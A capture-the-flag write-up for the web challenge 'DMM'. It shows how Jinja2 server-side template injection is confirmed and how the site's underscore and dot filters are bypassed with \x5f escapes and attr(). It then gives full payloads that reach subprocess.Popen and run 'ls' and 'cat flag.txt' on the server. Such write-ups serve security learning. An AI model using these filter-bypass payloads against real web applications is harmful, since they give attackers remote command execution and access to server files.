<h1>DMM</h1>
<h4>Description: 
<p>Please check it carefully</p>
<h4>Category: Web</h4>
<h4>Link: http://ssti.darkarmy.xyz/</h4>

Visiting the webpae just gives a message saying use to enter url. We can enter the url with parameter <b>/?url=</b> .
If we enter <b>/?url={{7*7}}</b>, we get the result on the page. This indicates that we can use SSTI but there are many filters on the website. <a href='https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f'>This article will help you with bypassing the filters</a> .
We can look for the modules available with us using this payload
<h4>{{().__class__.__base__.__subclasses__()}}</h4>
but we need to bypass the "_" and "." check. "_" is converted to \x5f and to get '.' we use attr, (foo|attr('bar') will be foo.bar)
<h4>{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}}</h4>

We will get the list of classes, we need the subprocess.Popen class. You need the index of this class and use it to run commands.
So our general payload woud be
<h4>().__class__.__base__.__subclasses__()[407]('ls',shell=True,stdout=-1).communicate()[0]}}</h4>
So our actual payload would be
<h4>{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(407)('ls',shell=True, stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)}}</h4>

Now we can get the flag with this payload, (change the command in the above payload to get the flag)
<h4>{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(407)('cat flag.txt',shell=True, stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)}}</h4>

<h4>FLAG: darkCON{w0ww_y0u_ar3_sUp3er_h4ckeR_ggwpp_!!}</h4>
